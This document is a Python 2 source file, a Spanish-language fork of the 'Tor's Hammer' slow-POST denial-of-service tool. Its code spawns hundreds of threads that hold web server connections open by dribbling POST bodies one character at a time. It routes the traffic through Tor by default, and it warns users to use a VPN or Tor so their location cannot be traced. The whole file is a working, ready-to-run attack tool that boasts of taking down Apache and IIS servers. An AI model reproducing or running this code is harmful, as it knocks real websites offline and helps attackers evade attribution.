#!/usr/bin/python
# -*- coding: utf-8 -*-
# agradecimientos a ShadowsDdos
"""
Tor's Hammer - Slow POST Denial Of Service Testing Tool
Version 1.0 Beta
Project home page: https://sourceforge.net/projects/torshammer

Tor's Hammer is a slow post dos testing tool written in Python.
It can also be run through the Tor network to be anonymized.
If you are going to run it with Tor it assumes you are running Tor on 127.0.0.1:9050. 
Kills most unprotected web servers running Apache and IIS via a single instance.
Kills Apache 1.X and older IIS with ~128 threads.
Kills newer IIS and Apache 2.X with ~256 threads.
"""

import click    
import os
import re
import time
import sys
import random
import math
import getopt
import socket 
import socks 
import requests 
import string
import terminal
from colorama import Fore, Back, Style 
import urllib2 
from threading import Thread
from urllib2 import urlopen
import re
import json

global stop_now
global term

stop_now = False
term = terminal.TerminalController()


useragents = [
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
 "Opera/9.20 (Windows NT 6.0; U; en)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Neo) Version/4.0 Safari/528.16",
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", 
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Neo/20100804 Gentoo Firefox/3.6.8",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
]

def check_url( url, timeout=5 ):
	
    try:
        return urllib2.urlopen(url,timeout=timeout).getcode() == 200
    except urllib2.URLError as e:
        return False
    except socket.timeout as e:
        return False

class httpPost(Thread):
    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True
		
    def _send_http_post(self, pause=10):
        global stop_now

        self.socks.send("POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 900\r\n"
                        "Content-Length: 10000\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
                        (self.host, random.choice(useragents)))

        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters + string.digits)
            print Fore.GREEN + Style.BRIGHT + "Publicado: ("+ Style.RESET_ALL + Fore.RED + Style.BRIGHT + " %s " % p + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + ")" + Style.RESET_ALL
            self.socks.send(p)
            time.sleep(random.uniform(0.1, 3))
	
        self.socks.close()
		
    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:     
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                    self.socks.connect((self.host, self.port))
                    print Fore.GREEN + Style.BRIGHT + "* Conectado Cliente a TOR. " + Style.RESET_ALL
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print Fore.RED + Style.BRIGHT + "* Error al Conectar Cliente. " + Style.RESET_ALL
                    time.sleep(1)
                    continue
	
            while self.running:
                try:
                    self._send_http_post()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print Fore.YELLOW + Style.BRIGHT + "* Re-Conectando Cliente. " + Style.RESET_ALL

                        self.socks = socks.socksocket()
                        break
                    time.sleep(0.1)
                    pass

def usage():
    print "python fastjack.py -t <web> [-r <Clientes> -p <Puerto> -T -h]"
    print " -t / --web: <Web | IP>"
    print " -r / --clientes: <Numero de Clientes> Defecto: 256"
    print " -p / --puerto : <Puerto Web> Defecto: 80"
    print " -T / --tor: Enable anonymising through tor on 127.0.0.1:9050"
    print " -h : Muestra esta Ayuda\n" 
    print "Ej. Python fastjack.py -t www.ejemplo.com"
    print "Ej. Python fastjack.py -t www.ejemplo.com -r 256 -p 80\n"

tor = True
if tor is True:
    ipcheck_url = 'http://canihazip.com/s'
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050) 
    socket.socket = socks.socksocket

    try:       
        tor_ip = requests.get(ipcheck_url) 
        tor_ip = str(tor_ip.text) 

    except requests.exceptions.RequestException as e:
        sys.exit(0)

def main(argv):

    try:
        opts, args = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
    except getopt.GetoptError:
        usage() 
        sys.exit(-1)

    global stop_now

    target = sys.argv[1]	
    threads = 256
################## cambie tor = True por False para desactivar auto conexion a Tor.
    tor = True
##################
    port = 80

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            sys.exit(0)
        if o in ("-T", "--tor"):
            tor = True
        elif o in ("-t", "--web"):
            target = a
        elif o in ("-r", "--clientes"):
            threads = int(a)
        elif o in ("-p", "--puerto"):
            port = int(a)

    if target == '' or int(threads) <= 0:
        usage()
        sys.exit(-1)

    print Back.CYAN +  Style.BRIGHT + "Verificando Seguridad. " + Style.RESET_ALL
    print Fore.GREEN + Style.BRIGHT + "Tu Host Actual es: " + socket.gethostbyname(socket.gethostname()) + Style.RESET_ALL

    if tor is True:
        print Fore.GREEN + Style.BRIGHT + "Conexion TOR: " + Style.RESET_ALL + Back.GREEN + "Activada" + Style.RESET_ALL
        print Fore.GREEN + Style.BRIGHT + "Nueva Conexion IP-TOR: "+ Style.RESET_ALL + Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + tor_ip + Style.RESET_ALL

    if tor is False:
        print Fore.GREEN + Style.BRIGHT + "Conexion TOR: " + Style.RESET_ALL + Back.RED + "Desactivado"+ Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " o " + Style.RESET_ALL + Back.RED + "NO Encontrada" + Style.RESET_ALL
        ipcheck_url2 = 'http://canihazip.com/s' 
        try:
            regular_ip = requests.get(ipcheck_url2) 
            regular_ip = str(regular_ip.text) 
            print Fore.GREEN + Style.BRIGHT + "Tu IP Externo es: "+ Style.RESET_ALL + Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + regular_ip + Style.RESET_ALL
            print Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + "Utilice siempre una conexion VPN..." + Style.RESET_ALL
            print Fore.YELLOW + Style.BRIGHT + "Si usted no cuenta con VPN y/o TOR" + Style.RESET_ALL
            print Fore.YELLOW + Style.BRIGHT + "NO se arriesgue y NO utilice este progrema." + Style.RESET_ALL
            print Fore.YELLOW + Style.BRIGHT + "Sin una proteccion adecuada, su ubicacion podria ser rastreada.." + Style.RESET_ALL
            click.confirm('..................... ' +Back.RED + Fore.GREEN + Style.BRIGHT +'Quieres Continuar?' + Style.RESET_ALL, abort=True)
        except requests.exceptions.RequestException as e:
            sys.exit(0)
############################### SI usted no usa Gnome Terminal agrege un # a la linea de abajo. Gato o HashTag 
    os.system("gnome-terminal -- python hostjack-checker.py " + target)
###############################
    print Back.CYAN +  Style.BRIGHT + "Verificando Estado del Servidor" + Style.RESET_ALL
    resultado = check_url("http://" + target)
    if resultado == True:
       print Fore.GREEN + Style.BRIGHT + "Servidor" + Style.RESET_ALL + Fore.RED + Style.BRIGHT + " %s " % (target) + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + ": " + Style.RESET_ALL + Back.GREEN + "Operando " + Style.RESET_ALL
       print Fore.GREEN + Style.BRIGHT + "NOTA: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "Todo parece en orden, comencemos... " + Style.RESET_ALL
       time.sleep(3) 

    if not resultado == True:
       print Fore.GREEN + Style.BRIGHT + "Servidor" + Style.RESET_ALL + Fore.RED + Style.BRIGHT + " %s " % (target) + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + ": " + Style.RESET_ALL + Back.RED +  "No Disponible " + Style.RESET_ALL
       print Fore.GREEN + Style.BRIGHT + "NOTA: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "EL SERVIDOR" + Style.RESET_ALL + Fore.RED + Style.BRIGHT + " %s "  % (target) + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "PARECE NO ESTAR DISPONIBLE... " + Style.RESET_ALL
       print Fore.GREEN + Style.BRIGHT + "NOTA: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "Si quiere una mayor eficacia, por favor confirme con (" + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + "y" + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + ")." + Style.RESET_ALL
       print 
       click.confirm('..................... ' +Back.RED + Fore.GREEN + Style.BRIGHT +'Quieres Continuar?' + Style.RESET_ALL, abort=True)
    print Back.GREEN + Style.BRIGHT + "Objetivo:" + Style.RESET_ALL + Back.RED +  " %s " % (target) + Style.RESET_ALL + Back.GREEN + "Puerto:" + Style.RESET_ALL + Back.RED + " %d " % (port) + Style.RESET_ALL
    print Back.GREEN + Style.BRIGHT + " * Clientes:" + Style.RESET_ALL + Back.RED + " %d " % (threads) + Style.RESET_ALL

    rthreads = []
    for i in range(threads):
        t = httpPost(target, port, tor)
        rthreads.append(t)
        t.start()

    while len(rthreads) > 0:
        try:
            rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
        except KeyboardInterrupt:
            print "\nCerrando Clientes...\n"
            for t in rthreads:
                stop_now = True
                t.running = False

if __name__ == "__main__":

    main(sys.argv[1:])

